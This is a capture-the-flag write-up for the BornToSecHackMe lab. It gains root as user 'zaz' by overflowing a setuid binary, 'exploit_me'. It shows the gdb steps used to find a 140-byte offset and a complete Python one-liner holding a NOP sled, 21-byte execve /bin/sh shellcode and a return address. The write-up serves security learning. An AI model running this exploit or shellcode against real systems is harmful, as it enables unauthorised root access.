# Privilege Escalation via Buffer Overflow and Shellcode Injection (User: `zaz`)

As the user **`zaz`**, we are given a binary named `exploit_me` that is vulnerable to a classic **buffer overflow**. We'll exploit it using a custom **shellcode** to spawn a `/bin/sh` shell — ultimately granting us root access.

---

### Step 1: Identify the Overflow Offset

First, we determine how many bytes are required to reach the return address. This is done by launching the program in `gdb` and intentionally causing a segmentation fault:

```bash
zaz@BornToSecHackMe:~$ gdb exploit_me
(gdb) b main
Breakpoint 1 at 0x80483f7
(gdb) r AAAAAAAA
Starting program: /home/zaz/exploit_me AAAAAAAA
Breakpoint 1, 0x080483f7 in main ()
```

We then inspect the stack to find where `argv[1]` (our input) is located:

```bash
(gdb) x/150x $esp
```

After examining the output, we identify the memory address of `argv[1]` — our input buffer:

```
(gdb) x/s 0xbffff927
0xbffff927: "A"
```

So, we determine:

* The **offset** to the return address is **140 bytes** (as seen in WriteUp1).
* The **address of `argv[1]`** is approximately **`0xbffff927`**, which we'll align to `0xbffff8c0` or similar for padding reliability.

---

### Step 2: Prepare the Exploit Payload

To build a successful exploit, we’ll construct a payload consisting of:

1. **NOP sled** (for safe landing): 50 bytes of `\x90`
2. **Shellcode**: 21-byte payload to spawn `/bin/sh`
3. **Padding**: Fills the space between shellcode and return address
4. **Return address overwrite**: Points back into our NOP sled or shellcode (e.g. `\xc0\xf8\xff\xbf` for address `0xbffff8c0`)

Here is the final one-liner to execute the binary with the exploit:

```bash
./exploit_me $(python -c 'print("\x90" * 50 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * (140 - 50 - 21) + "\xc0\xf8\xff\xbf")')
```

Explanation of the shellcode:

* `\x6a\x0b`: push syscall number for `execve`
* `\x68...`: push `/bin//sh`
* `\x89\xe3`: move stack pointer to `ebx`
* `\xcd\x80`: trigger syscall

---

### Step 3: Success — Gaining Root

If the binary is setuid root (as expected), the shell we spawn will be a **root shell**:

```bash
# id
uid=0(root) gid=1000(zaz) groups=1000(zaz)
```

✅ **We have successfully escalated privileges to root!**